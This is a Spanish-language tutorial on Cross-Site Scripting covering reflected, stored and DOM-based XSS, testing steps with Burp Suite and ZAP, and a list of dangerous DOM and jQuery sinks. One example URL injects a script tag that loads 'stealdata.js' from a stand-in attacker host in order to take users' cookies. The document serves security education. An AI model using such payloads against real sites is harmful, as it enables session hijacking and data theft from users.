<h1 id="portswigger-xss">Cross-Site Scripting (XSS)</h1>

- [¿Qué es un Cross-Site Scripting?](#que-xss)
- [¿Cómo funciona un XSS?](#como-xss)
- [¿Qué tipos de XSS existen?](#tipo-xss)
  - [Reflected XSS](#reflected-xss)
    - [Impacto de los ataques reflected XSS](#impacto-reflected-xss)
    - [Contextos de reflected XSS](#context-reflected-xss)
    - [¿Cómo se puede encontrar y testear una vulnerabilidad de reflected XSS?](#find-reflected-xss)
  - [Stored XSS](#stored-xss)
    - [Impacto de los ataques stored XSS](#impacto-stored-xss)
    - [Contextos de stored XSS](#context-stored-xss)
    - [¿Cómo se puede encontrar y testear una vulnerabilidad de stored XSS?](#find-stored-xss)
  - [DOM-based XSS](#dom-xss)
    - [¿Cómo testear un DOM-based XSS?](#test-dom-xss)
      - [Testeando HTML sinks](#testeando-html-sinks)
      - [Testeando sinks que ejecutan JavaScript](#testeando-sinks-que-ejecutan-javascript)
    - [¿Qué sinks pueden generar vulnerabilidades DOM-XSS?](#que-sink-xss)
  - [Contextos](#contextos)

<h2 id="que-xss">¿Qué es un Cross-Site Scripting?</h2>

Un cross-site scripting (también conocido como XSS), es una vulnerabilidad web, la cual, permite a un atacante comprometer la interacción de un usuario con la aplicación.

Por lo general, este tipo de ataque permite al atacante hacerse pasar por la víctima, donde, puede llevar a cabo cualquier acción que la víctima pueda realizar, y poder acceder a información de este. Esto podría permitir al atacante ganar privilegios sobre esta, si es que la víctima tiene control sobre esta.

<h2 id="como-xss">¿Cómo funciona un XSS?</h2>

Estos permiten manipular una web vulnerable, retornando un JavaScript malicioso a un usuario. Por lo tanto, cuando este código es ejecutado en el lado del cliente, el atacante ha comprometido completamente la interacción del usuario con la aplicación.

Por ejemplo:

El usuario necesita enviar datos sensibles a la web, pero esta se encuentra comprometida:

1.	El usuario escribe un mensaje, las cuales son enviadas por un método GET al servidor.
2.	Este envío se encuentra comprometido, y el JavaScript indica que se van a enviar dichos datos a la página del atacante (`https://www.site.com/comments?message=<script src=https://attacker-site.com/stealdata.js></script>`).
3.	Los datos son almacenados en la página del atacante (como, por ejemplo, las cookies del usuario).

<h2 id="tipo-xss">¿Qué tipos de XSS existen?</h2>

Existen 3 tipos principales de XSS:

- **Reflected XSS:** cuando el script malicioso viene del HTTP request actual.
- **Stored XSS:** cuando el script es almacenado en la base datos del sitio web.
- **DOM-based XSS:** cuando la vulnerabilidad existe en el código del lado del cliente

<h3 id="reflected-xss">Reflected XSS</h3>

Esta vulnerabilidad aparece cuando la web recibe los datos enviados en el HTTP request y los incluye en la respuesta de forma insegura:

![port-xss-1](https://github.com/W0lfF4ng/Cheat-Sheet/blob/master/img/web/port-xss-1.png)

Si la víctima visita la URL construida por el atacante, se ejecutarán los scripts maliciosos en el navegador del usuario. Este script puede llevar a cabo cualquier acción y recuperar cualquier dato al que el usuario tenga acceso.

<h4 id="impacto-reflected-xss">Impacto de los ataques reflected XSS</h4>

Si un atacante puede controlar un script que se ejecuta en el navegador de la víctima, este puede:

-	Realizar cualquier acción que el usuario puede hacer dentro de la aplicación.
-	Ver cualquier información que el usuario está habilitada para ver.
-	Modificar cualquier información que el usuario está habilitada para modificar.
-	Iniciar interacción con otros usuarios de la aplicación, incluidos ataques, los cuales, parecerán realizados por la víctima.

Existen múltiples medios para que un usuario sea víctima de este ataque:

-	Colocar enlaces en un sitio web controlado por el atacante.
-	Enlaces en otro sitio web que permita generar contenido.
-	Enviar un tweet u otro mensaje.

El impacto de este ataque es mucho menor al stored XSS, debido que se necesita un mecanismo externo para realizar el ataque.

<h4 id="context-reflected-xss">Contextos de reflected XSS</h4>

Hay muchas formas de scripts para realizar un reflected XSS, donde, depende de la ubicación de los datos reflejados en la respuesta de la aplicación es cual payload se utilizará para realizar la explotación.

También, el payload depende de las validaciones u procesamientos que realiza la aplicación antes de reflejar los datos.

Los contextos que se pueden nombrar son:

-	XSS entre tags HTML
-	XSS en los atributos de un tag HTML
-	XSS en un JavaScript
-	XSS en el contexto del sandbox de AngularJS

<h4 id="find-reflected-xss">¿Cómo se puede encontrar y testear una vulnerabilidad de reflected XSS?</h4>

La mayoría de estos XSS se pueden encontrar usando un interception proxy, donde, los más populares son [Burp Suite](https://portswigger.net/burp) y [ZAP](https://owasp.org/www-project-zap/).

Realizar pruebas manuales de esta vulnerabilidad envuelve los siguientes pasos:

- **Probar todos los puntos de entrada:** testear por separado todos los puntos de entrada del HTTP request. Aquí se incluyen:
  - Parámetros
  - Otros datos dentro del string de la consulta de la URL y el cuerpo del mensaje
  - HTTP headers
- **Enviar valores alfanuméricos random:** para cada punto de entrada, enviar un valor aleatorio para validar si este es reflejado en la respuesta. Este valor debe estar pensado para pasar todas las validaciones de entrada. Para esto, debe ser corto y solo contener caracteres alfanuméricos, pero no tan corto, con el fin de hacer coincidencias accidentales que son altamente improbables dentro de la aplicación. Se recomienda que este sea de 8 caracteres (es posible usar la opción **Intruder** de Burp).
- **Determinar el contexto de reflexión:** es necesario determinar el contexto de la reflexión basándonos en la ubicación de los datos inyectados en la respuesta.
- **Probar un payload candidato:** según lo determinado en el paso anterior, realizar pruebas con el payload (en este punto se recomienda usar la opción **Repeater** del Burp). Se recomienda testear el payload tanto antes como después del valor aleatorio inicial.
- **Probar payloads alternativos:** puede que la aplicación bloquee el payload enviado, para esto, se deben probar nuevos payloads y nuevas técnicas para poder explotar esta vulnerabilidad.
- **Probar el ataque en el navegador:** en caso de encontrar un payload que funciona en **Repeater**, se recomienda transferir el ataque al navegador, para validar la inyección.

<h3 id="stored-xss">Stored XSS</h3>

Stored XSS (también conocido como persisten XSS o second-order XSS), es cuando se reciben los datos del HTTP request, y esto son almacenados en el lado del servidor, por lo tanto, cada vez que se consuma ese recurso de la aplicación web, se ejecutará el script malicioso.

Ejemplos de los datos que se pueden enviar, son comentarios en una web, nicknames en un chat, o detalles de contacto en un pedido.

En otros casos, los datos pueden llegar de otras fuentes no confiables; por ejemplo, una aplicación de correo web que muestra mensajes recibidos a través de SMTP, una aplicación de marketing que muestra publicaciones en redes sociales o una aplicación de monitoreo de red que muestra datos del tráfico de red.

En el siguiente ejemplo, al momento de crear un usuario en la aplicación web, el campo username es vulnerable a stored XSS, por lo tanto, cada vez que se ingrese a **users.php**, se ejecutará el script configurado:

![port-xss-2](https://github.com/W0lfF4ng/Cheat-Sheet/blob/master/img/web/port-xss-2.png)

Si vemos que se encuentra cargando la página, en la sección del username se tiene un script que muestra un pop-up con el mensaje **xss**:

![port-xss-3](https://github.com/W0lfF4ng/Cheat-Sheet/blob/master/img/web/port-xss-3.png)

<h4 id="impacto-stored-xss">Impacto de los ataques stored XSS</h4>

Si un atacante puede controlar el script que se ejecuta en el navegador de la víctima, puede llevar a cabo cualquier acción.

A diferencia del reflected XSS, cada vez que un usuario visite una web comprometida con esta vulnerabilidad, se ejecutará el script malicioso. Por lo tanto, permite realizar ataques autónomos.

<h4 id="context-stored-xss">Contextos de stored XSS</h4>

Existe múltiples variantes de un stored XSS, y este depende de la locación de donde se almacenen los datos.

Los contextos que se pueden nombrar son:

- XSS entre tags HTML
- XSS en los atributos de un tag HTML
- XSS en un JavaScript

<h4 id="find-stored-xss">¿Cómo se puede encontrar y testear una vulnerabilidad de stored XSS?</h4>

Una gran parte de estos XSS pueden ser detectados mediante un interception proxy.

Se deben testear todos los puntos de entrada, donde, los datos controlados por el atacante son procesados por la aplicación, y los puntos de salida en los que esos datos pueden aparecer en la respuesta de la aplicación.

Los puntos de entrada en el procesamiento de una aplicación incluyen:

- Parámetros u otros datos dentro de la consulta en la URL y el cuerpo del mensaje.
- La ruta del archivo en la URL.
- Los headers del HTTP request que podrían no ser explotados en relación con un reflected XSS.
- Cualquier ruta fuera de banda a través de la cual un atacante puede enviar datos a la aplicación, ejemplos: una aplicación de correo web procesará los datos recibidos en los correos electrónicos; una aplicación que muestra un feed de Twitter puede procesar datos contenidos en tweets de terceros; y un agregador de noticias incluirá datos originados en otros sitios web.

Los puntos de salida son todos los HTTP response posibles que se devuelven a cualquier usuario de la aplicación.

El primer paso en la prueba de vulnerabilidades stored XSS es localizar los enlaces entre los puntos de entrada y salida, por lo que los datos enviados a un punto de entrada son emitidos desde un punto de salida. Esto podría ser un desafío por las siguientes razones:

- Los datos enviados a cualquier punto de entrada podrían ser emitido en cualquier punto de salida.
- Los datos almacenados por la aplicación a menudo son vulnerables a sobrescribirse debido a otras acciones realizadas dentro de la aplicación. Por ejemplo, una función de búsqueda puede mostrar una lista de búsquedas recientes, que se reemplazan rápidamente a medida que los usuarios realizan otras búsquedas.

Identificar exhaustivamente los enlaces entre los puntos de entrada y salida implicaría probar cada permutación por separado, enviar un valor específico al punto de entrada, navegar directamente al punto de salida y determinar si el valor aparece allí. Sin embargo, este enfoque no es práctico en una aplicación con más de unas pocas páginas.

Un enfoque más realista es trabajar sistemáticamente a través de los puntos de entrada de datos, enviando un valor específico a cada uno de ellos y monitorear las respuestas de la aplicación para detectar cuando aparece el valor enviado.

Cuando haya identificado enlaces entre los puntos de entrada y salida en el procesamiento de la aplicación, cada enlace debe probarse específicamente para detectar si existe una vulnerabilidad de stored XSS. El payload a utilizar dependerá del contexto dentro de la respuesta, y la metodología a usar, es similar a la usada en reflected XSS.

<h3 id="dom-xss">DOM-based XSS</h3>

También conocido como DOM XSS es cuando una aplicación contiene un JavaScript en el lado del cliente que procesa datos desde un origen inseguro de una forma insegura, generalmente escribiendo los datos nuevamente en el DOM.

Por lo tanto, cuando un JavaScript toma datos desde un origen controlado por un atacante (como la URL), y los pasa a un [sink](https://www.acunetix.com/blog/articles/finding-source-dom-based-xss-vulnerability-acunetix-wvs/#:~:text=Sinks%2C%20on%20the%20other%20hand,Execution%20Sink) que admite la ejecución dinámica de código (por ejemplo: **eval()** o **innerHTML**). Esto permite al atacante ejecutar un JavaScript malicioso, con el cual, podría secuestrar las cuentas de otros usuarios.

Para realizar este ataque, se deben colocar datos en un origen para que se propaguen a un sink, y provoque la ejecución de JavaScript de forma arbitraria.

El origen más común es la URL, donde se usa el objeto **Windows.location**.

Un atacante puede construir un enlace para enviar a una víctima a una página vulnerable con una payload útil en string de la consulta y fragmentar partes de la URL (como cuando se dirige a una página 404 o un sitio web que ejecuta PHP, el payload se puede colocar en la ruta).

<h4 id="test-dom-xss">¿Cómo testear un DOM-based XSS?</h4>

Al igual que los otros tipos de XSS, este puede ser detectado usando un intercepting proxy.

Para testear este XSS, se debe tener un navegador con herramientas de desarrollador, como Firefox y Chrome.

<h5 id="testeando-html-sinks">Testeando HTML sinks</h5>

Para testear un DOM XSS en un HTML sink, se debe tener un string alfanumérico random en el origen (como **location.search**), entonces se debe usar las herramientas de desarrollo para inspeccionar el HTML y buscar donde se encuentra el string ingresado (no se recomienda el uso de **View source** del navegador debido que no funcionará para las pruebas DOM XSS porque no tiene en cuenta los cambios que JavaScript ha realizado en HTML).

Para cada ubicación donde aparece el string dentro del DOM, se debe identificar el contexto. Según este contexto, debe refinar su entrada para ver cómo se procesa.

Es necesario que los navegadores se comportan de manera diferente con respecto a la codificación de URL.

<h5 id="testeando-sinks-que-ejecutan-javascript">Testeando sinks que ejecutan JavaScript</h5>

Con estos sinks, no se muestra nuestra entrada en los DOM. Para poder encontrarla, se debe revisar en el debugger de JavaScript para identificar si la entrada se envía a un receptor y como es enviado.

Por cada potencial origen (como location), se debe encontrar dentro del código JavaScript de la página donde se hace referencia al origen.

Una vez que identificado dónde se está leyendo el origen, se puede usar el debugger de JavaScript para agregar un punto de interrupción y ver cómo se está usando el valor del origen. Se puede encontrar que la fuente se asigna a otras variables. Si este es el caso, se deberá volver a utilizar la función de búsqueda para rastrear estas variables y ver si se pasan a un sink. Cuando se encuentre un sink al que se le están asignando los datos del origen, se puede usar el debugger para inspeccionar el valor pasando el cursor sobre la variable para mostrar su valor antes de enviarlo al sink. Luego, al igual que con los sink HTML, se debe refinar la entrada para ver si se puede lanzar un ataque XSS exitoso.

<h4 id="que-sink-xss">¿Qué sinks pueden generar vulnerabilidades DOM-XSS?</h4>

La siguiente lista contiene los principales sinks que pueden generar una vulnerabilidad DOM XSS:

- document.write()
- document.writeln()
- document.domain
- someDOMElement.innerHTML
- someDOMElement.outerHTML
- someDOMElement.insertAdjacentHTML
- someDOMElement.onevent

Las siguientes funciones jQuery también son principales sinks que pueden generar una vulnerabilidad DOM XSS:

- add()
- after()
- append()
- animate()
- insertAfter()
- insertBefore()
- before()
- html()
- prepend()
- replaceAll()
- replaceWith()
- wrap()
- wrapInner()
- wrapAll()
- has()
- constructor()
- init()
- index()
- jQuery.parseHTML()
- $.parseHTML()

<h3 id="contextos">Contextos</h3>

Cuando se hacen pruebas para reflected XSS y stored XSS, la clave es identificar el contexto de este:

- La ubicación dentro de la respuesta donde aparecen los datos enviados por el atacante.
- Cualquier validación de entrada u otro procesamiento que la aplicación esté realizando en esos datos.
